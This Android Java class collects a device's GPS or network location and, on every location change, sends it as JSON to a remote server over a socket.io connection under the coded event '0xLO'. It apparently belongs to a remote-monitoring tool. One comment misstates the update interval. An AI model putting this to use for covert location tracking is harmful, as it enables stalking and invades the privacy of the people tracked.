package com.example.locmanager;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;

import org.json.JSONException;
import org.json.JSONObject;
import static android.content.Context.LOCATION_SERVICE;

import androidx.annotation.NonNull;

import com.example.commoninterfaces.IOSocket;

public class LocManager implements LocationListener {
    private final Context mContext;
    boolean isGPSEnabled = false;
    boolean isNetworkEnabled = false;
    boolean canGetLocation = false;
    Location location;
    double latitude;
    double longitude;
    float accuracy;
    double altitude;
    float speed;

    // The minimum distance to change Updates in meters
    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10; // 10 meters

    // The minimum time between updates in milliseconds
    private static final long MIN_TIME_BW_UPDATES = 1000 * 60; // 10 minutes

    // Declaring a Location Manager
    protected LocationManager locationManager;

    public LocManager() {
        this.mContext = null;
    }

    public LocManager(Context context) {
        this.mContext = context;
        getLocation(this.mContext);
    }

    public void getLocation(Context context) {
        try {
            locationManager = (LocationManager) mContext.getSystemService(LOCATION_SERVICE);
            // getting GPS status
            isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            // getting network status
            isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (isGPSEnabled || isNetworkEnabled) {

                this.canGetLocation = true;
                if (context.getPackageManager().checkPermission(Manifest.permission.ACCESS_FINE_LOCATION, context.getPackageName())
                        == PackageManager.PERMISSION_GRANTED &&
                        context.getPackageManager().checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION, context.getPackageName())
                                == PackageManager.PERMISSION_GRANTED) {
                    // First get location from Network Provider
                    if (isNetworkEnabled) {

                        if (locationManager != null) {
                            location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                            if (location != null) {
                                latitude = location.getLatitude();
                                longitude = location.getLongitude();
                                altitude = location.getAltitude();
                                accuracy = location.getAccuracy();
                                speed = location.getSpeed();
                            }
                        }
                    }

                    // if GPS Enabled get lat/long using GPS Services
                    if (isGPSEnabled) {
                        if (location == null) {

                            if (locationManager != null) {
                                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                                if (location != null) {
                                    latitude = location.getLatitude();
                                    longitude = location.getLongitude();
                                    altitude = location.getAltitude();
                                    accuracy = location.getAccuracy();
                                    speed = location.getSpeed();
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public boolean canGetLocation() {
        return this.canGetLocation;
    }

    public JSONObject getData(){
        JSONObject data = new JSONObject();
        if(location != null) {
            try {
                data.put("enabled" , true);
                data.put("latitude", latitude);
                data.put("longitude", longitude);
                data.put("altitude", altitude);
                data.put("accuracy", accuracy);
                data.put("speed", speed);

                return data;
            } catch (JSONException e) {
                return data;
            }
        } else {
            return data;
        }
    }

    @Override
    public void onLocationChanged(@NonNull Location location) {
        latitude = location.getLatitude();
        longitude = location.getLongitude();
        altitude = location.getAltitude();
        accuracy = location.getAccuracy();
        speed = location.getSpeed();
        new IOSocket(mContext).getIoSocket().emit("0xLO" , getData());
    }

    @Override
    public void onProviderDisabled(@NonNull String provider) {
        //
    }

    @Override
    public void onProviderEnabled(@NonNull String provider) {
        //
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
        //
    }
}